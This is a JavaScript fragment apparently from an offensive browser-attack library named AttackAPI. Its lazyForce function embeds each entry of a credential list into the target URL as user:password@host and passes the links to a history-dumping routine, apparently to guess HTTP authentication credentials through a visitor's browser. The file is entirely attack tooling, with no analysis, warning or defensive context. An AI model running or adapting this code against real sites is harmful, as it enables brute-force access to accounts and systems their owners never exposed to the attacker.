AttackAPI.AuthorizationForcer = {};
AttackAPI.AuthorizationForcer.lazyForce = function (callback, target, credentials) {
	var links = new Array();
	var protocol = target.substring(0, target.indexOf(':'));
	var url = target.substring(target.indexOf(':') + 3);
	
	for (index = 0; index < credentials.length; index++) {
		var link = new String(protocol + '://' + credentials[index] + '@' + url);
		link.target = target;
		link.credential = credentials[index];
		links.push(link);
	}
	
	AttackAPI.HistoryDumper.lazyDump(function (link, status) {
		callback(link.target, link.credential, status);
	}, links);
};
